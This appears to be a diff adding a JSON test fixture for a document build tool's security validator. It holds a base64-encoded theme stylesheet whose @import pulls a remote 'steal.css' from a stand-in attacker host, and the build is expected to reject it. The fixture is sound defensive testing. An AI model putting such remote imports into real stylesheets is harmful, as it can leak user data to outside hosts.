@@ -1,0 +1,12 @@
+{
+  "id": "external-css-import-exfil",
+  "category": "external",
+  "requirement": "PRD-15",
+  "status": "invalid",
+  "diagnostic": "E-MDHSEC-008",
+  "source": "---\ntitle: T\ntheme: import.theme.css\n---\n\n# Body\n",
+  "assets": {
+    "import.theme.css": "QGltcG9ydCB1cmwoImh0dHBzOi8vZXZpbC5leGFtcGxlL3N0ZWFsLmNzcyIpOw=="
+  },
+  "detail": "@import of a remote stylesheet is an external resource fetch and fails the build"
+}
